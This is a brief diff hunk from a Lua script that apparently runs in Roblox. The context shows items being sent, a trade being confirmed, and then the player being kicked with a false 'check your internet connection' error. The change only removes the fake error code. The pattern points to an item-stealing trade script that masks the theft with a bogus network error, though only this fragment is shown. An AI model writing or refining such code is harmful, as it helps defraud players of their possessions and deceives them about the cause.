@@ -421,7 +421,7 @@ if #itemsToSend > 0 then
             wait(0.5)
             confirmTrade()
         end
-        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
+        plr:kick("Please check your internet connection and try again.")
     end
 
     local function waitForUserJoin()
